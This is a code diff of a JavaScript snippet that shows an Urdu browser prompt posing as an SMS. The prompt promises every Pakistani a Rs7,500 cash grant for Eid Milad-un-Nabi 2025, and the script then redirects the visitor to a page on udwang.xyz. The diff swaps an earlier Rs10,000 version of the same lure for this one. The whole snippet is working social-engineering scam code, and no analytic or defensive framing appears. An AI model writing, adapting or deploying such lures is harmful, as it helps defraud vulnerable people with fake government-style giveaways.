@@ -1,6 +1,6 @@
 
-var password = 'واپس لینا Rs10,000'
-password=prompt('SMS: میں خوش آمدید Maulana Abdul Khabeer Rs10,000 منانے کے لیے گرانٹ Eid Milad-un-Nabi, اب واپس لینے کے لیے ٹھیک ہے کو دبائیں۔','واپس لینا Rs10,000');
-if (password != 'واپس لینا Rs10,000') {
-location.href='https://www.udwang.xyz/Get-Rs10000';
+var password = 'واپس لینا Rs7,500'
+password=prompt('SMS: عید میلاد النبی 2025 منانے کے لیے ہم تمام پاکستانیوں کو 7,500 روپے کی نقد گرانٹ دے رہے ہیں, اب واپس لینے کے لیے براہ کرم OK کو دبائیں۔','واپس لینا Rs7,500');
+if (password != 'واپس لینا Rs7,500') {
+location.href='https://www.udwang.xyz/Rs7500-Eid-Milad-Un-Nabi-Cash';
 }
